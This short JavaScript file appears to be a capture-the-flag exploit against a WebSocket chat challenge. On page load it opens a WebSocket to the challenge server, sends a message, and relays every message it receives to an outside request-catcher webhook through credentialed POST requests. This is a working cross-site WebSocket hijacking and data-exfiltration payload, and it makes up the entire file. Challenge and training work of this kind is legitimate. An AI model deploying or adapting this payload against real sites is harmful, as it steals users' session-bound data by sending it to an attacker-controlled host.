const WEBHOOK = "https://totototo.requestcatcher.com";

function webhook(domain = "", data = null) {
  let req = new XMLHttpRequest();
  req.open("POST", WEBHOOK + domain, false);
  req.withCredentials = true;
  req.send(data);
}

console.log("/init");

let socket;

// Initialize WebSocket connection
function initWebSocket() {
  socket = new WebSocket("wss://wembsoncket.chal.cyberjousting.com");

  socket.onopen = () => {
    console.log("/onopen");
    sendMessage({ sender: "user", message: WEBHOOK });
  };

  socket.onmessage = (event) => {
    // const messageData = JSON.parse(event.data);
    console.log("/onmessage", event.data);
    webhook("/onmessage", event.data);
  };

  socket.onclose = () => {
    console.log("/onclose");
  };

  socket.onerror = (error) => {
    console.log("/onerror", error);
  };
}

// Send message to the server and display it locally
function sendMessage(data) {
  // { sender: "user", message }
  socket.send(JSON.stringify(data));
}

// Initialize WebSocket connection on page load
initWebSocket();
